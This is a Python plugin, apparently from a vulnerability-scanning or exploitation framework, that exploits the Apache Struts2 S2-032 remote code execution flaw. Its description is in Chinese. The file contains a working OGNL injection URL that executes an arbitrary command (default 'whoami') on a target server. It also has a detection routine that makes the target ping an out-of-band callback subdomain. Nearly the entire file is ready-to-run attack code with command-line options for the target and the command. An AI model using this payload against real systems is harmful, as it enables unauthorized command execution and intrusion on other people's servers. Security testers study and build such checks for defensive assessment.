# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Struts2远程代码执行漏洞",
        "version": "Struts 2.x < 2.3.20.2, Struts 2.3.28.x < 2.3.28.1, Struts 2.3.24.x < 2.3.24.2",
        "description": "S2-032漏洞的影响范围是Struts 2.3.20 - Struts Struts 2.3.28，当开启了动态方法调用时可RCE。这次的漏洞分析以及后面的漏洞分析都是使用的Struts 2.3.24。在我们的第一篇文章中就讲过invokeAction方法是真正执行action中方法的地方，而低版本中式通过反射的方法来执行的，高版本中式通过Ognl表达式执行的，所以这次的S2-032并不影响低版本的Struts2。",
        "references": ["-"],
    }

    def url(self) -> dict:
        with self.echo_query() as execute:
            subdomain = execute.get_subdomain()
            self.exec_cmd(self.target.url, f'ping -nc 1 {subdomain}')
            if execute.verify():
                return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.url}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        self.log.info(f"利用{self.__info__['name']}执行命令无回显")
        self.request(
            method='GET',
            url=urllib.parse.urljoin(url, "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd="+cmd+"&pp=____A&ppp=%20&encoding=UTF-8"),
            timeout=15,
        )
